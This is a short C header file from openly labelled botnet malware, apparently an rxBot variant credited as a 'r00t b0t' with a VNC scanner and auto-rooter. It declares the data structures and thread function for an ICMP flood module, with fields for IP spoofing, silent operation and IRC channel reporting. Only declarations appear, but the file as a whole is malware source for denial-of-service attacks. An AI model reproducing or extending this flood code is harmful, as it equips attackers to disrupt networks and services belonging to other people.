/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/

#ifndef NO_ICMP
typedef struct ICMPFLOOD {

	SOCKET sock;
	char ip[MAXIP];
	char type[128];
	char chan[MAXCHANLEN];
	unsigned short port;
	int threadnum;
	int time;
	BOOL spoof;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} ICMPFLOOD;

typedef struct ECHOREQUEST
{
	IPHEADER ipHeader;
    ICMPHEADER icmpHeader;
    char cData[1024];

} ECHOREQUEST;


DWORD WINAPI ICMPFloodThread(LPVOID param);
#endif